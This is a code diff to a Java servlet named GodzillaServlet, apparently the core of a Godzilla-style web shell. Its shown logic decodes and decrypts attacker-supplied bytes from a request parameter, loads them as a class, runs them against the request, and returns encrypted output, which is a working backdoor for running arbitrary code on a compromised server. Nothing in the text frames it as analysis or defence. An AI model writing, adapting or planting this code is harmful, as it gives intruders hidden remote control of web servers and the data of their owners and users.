@@ -37,20 +37,15 @@ public class GodzillaServlet extends ClassLoader implements Servlet {
                 byte[] data = base64Decode(request.getParameter(pass));
                 data = this.x(data, false);
                 if (session.getAttribute("payload") == null) {
-                    session.setAttribute("payload", (new GodzillaServlet(this.getClass().getClassLoader())).Q(data));
+                    session.setAttribute("payload", (new GodzillaServlet(Thread.currentThread().getContextClassLoader())).Q(data));
                 } else {
-                    request.setAttribute("parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f;
-                    try {
-                        f = ((Class<?>) session.getAttribute("payload")).newInstance();
-                    } catch (Exception e) {
-                        throw new RuntimeException(e);
-                    }
+                    Object f = ((Class<?>) session.getAttribute("payload")).newInstance();
                     f.equals(arrOut);
                     f.equals(request);
-                    response.getWriter().write(md5.substring(0, 16));
+                    f.equals(data);
                     f.toString();
+                    response.getWriter().write(md5.substring(0, 16));
                     response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                     response.getWriter().write(md5.substring(16));
                 }
